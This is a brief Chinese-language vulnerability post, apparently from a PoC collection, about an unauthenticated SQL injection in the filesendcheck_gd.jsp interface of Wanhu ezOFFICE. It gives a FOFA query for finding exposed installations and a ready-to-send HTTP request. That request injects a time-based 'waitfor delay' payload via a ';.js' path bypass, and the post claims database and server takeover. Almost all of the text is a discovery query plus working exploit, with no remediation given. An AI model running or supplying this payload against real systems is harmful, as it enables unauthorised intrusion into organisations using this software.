# 万户ezOFFICE系统接口filesendcheck_gd.jsp存在SQL注入漏洞

万户 ezOFFICE filesendcheck_gd.jsp 接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。

## fofa

```yaml
app="万户ezOFFICE协同管理平台"
```

## poc

```javascript
GET /defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:5'-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409101024017.png)